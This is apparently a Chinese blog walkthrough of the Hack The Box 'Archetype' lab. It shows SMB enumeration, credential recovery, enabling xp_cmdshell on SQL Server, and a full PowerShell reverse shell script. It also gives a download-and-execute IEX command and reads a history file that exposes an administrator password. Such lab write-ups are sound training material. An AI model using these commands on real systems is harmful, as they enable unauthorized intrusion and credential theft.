---
title: HTB-Archetype靶机思路 
tags: HTB,靶机,思路
renderNumberedHeading: true
grammar_cjkRuby: true
---


## 前言

>这个是之前打过的靶机，之前也记录了一下，现在把它放在博客里，方便自己查看
>其实按照他里面的步骤一步一步来就可以了，但是中间踩了好多坑，心累，所以记录一下

## 环境准备

>操作机：Kali Linux

>首先要在 Kali 上安装 openvpn
>```
>apt-get install network-manager-openvpn
>apt-get install network-manager-openvpn-gnome
>apt-get install network-manager-pptp
>apt-get install network-manager-pptp-gnome
>apt-get install network-manager-strongswan
>apt-get install network-manager-vpnc
>apt-get install network-manager-vpnc-gnome
>```

安装openvpn之后，我们来下载.ovpn文件

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600845167236.png)

使用opnvpn来访问这个文件，连上环境IP

`sudo openvpn MrHat-startingpoint.ovpn`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600845353335.png)

然后试着 ping 一下目标IP `10.10.10.27`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600846212044.png)

## 信息收集

环境配置好之后，目标IP也知道了，进行简单的信息收集

首先端口扫描，看看是否开放可疑端口
`sudo nmap -sC -sV 10.10.10.27`

> -sC 根据端口识别的服务,调用默认脚本
> 
> -sV 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测 

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600846553562.png)

开放端口：
- 135  msrpc        Microsoft Windows RPC 
- 139  netbios-ssn  Microsoft Windows netbios-ssn 
- 445  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds 
- 1433 ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM

## 漏洞利用

>445 文件共享（SMB）
>
>1433  SQL Server相关联

先看一下445端口的SMB是否允许匿名访问
`smbclient -N -L \\\\10.10.10.27\\`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600847031208.png)

`backups` 目录 一般来说是备份目录
连接一下 `backups` 目录，然后 `dir` 查看一下目录下的文件

`smbclient -N -L \\\\10.10.10.27\\backups`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600847147868.png)

可以看到里面有一个 `prod.dtsConfig` 文件，我们下载一下

`get prod.dtsConfig`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600847259590.png)

查看一下里面的内容

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600847308001.png)

它包含一个 `SQL 连接字符串` 和本地 Windows 用户 `ARCHETYPE\sql_svc`

接下来我们使用 `Impacket` 下的 `mssqlclient.py` 来连接一下这个 Sql Server

>Github下载链接：https://github.com/SecureAuthCorp/impacket

下载完成，解压出来，然后安装依赖 执行 `pip install .`  注意有个点

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600847431335.png)

然后找到 examples 目录下的 `mssqlclient.py`

执行命令
`python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600847571370.png)

**`注意这个斜杠 文档复制出来的是 “\” 这个，但是不行 必须要 “/”这个斜杠才可以`**

成功连接 Sql Server，然后执行 sql 语句

先使用 `IS_SRVROLEMEMBER` 函数来查看当前 SQL 用户的权限是否为 sysadmin 最高权限

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600847804543.png)

返回1那就说明是 sysadmin 权限

接下来我们开启 `xp_cmdshell` 来执行系统命令
```sql?linenums
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
```
开启成功

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600848048509.png)

接下来执行一下系统命令 查看一下权限
`xp_cmdshell "whoami"`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600848113617.png)

## 权限提升

利用 powershell 反弹shell

新建一个 `shell.ps1` 文件
```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
注意修改一下 `ip`，`端口`

接下来我们使用 python3 来托管文件
`sudo python3 -m http.server 80`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600848857109.png)

使用 `nc` 来监听刚刚设置的端口，我设置的是 443

`sudo nc -lvnp 443`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600848941236.png)

然后执行系统命令来访问下载并执行文件

`xp_cmdshell "powershell "IEX (New-ObjectNet.WebClient).DownloadString(\"http://10.10.14.29/shell.ps1\");"`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600849065273.png)

看 nc 这边的反应

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600849164777.png)

反弹成功！

查看一下文件

`type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600849401803.png)

>文件内容:
>net.exe use T: rchetypeVbackups /user:administrator MEGACORP_4dmin!!

发现是 `administrator` 账户密码

我们通过 `Impacket/examples/psexec.py` 连接一下这个 administrator 账户

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600849493455.png)

## 获取Flag

Flag 在桌面

![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600849547580.png)







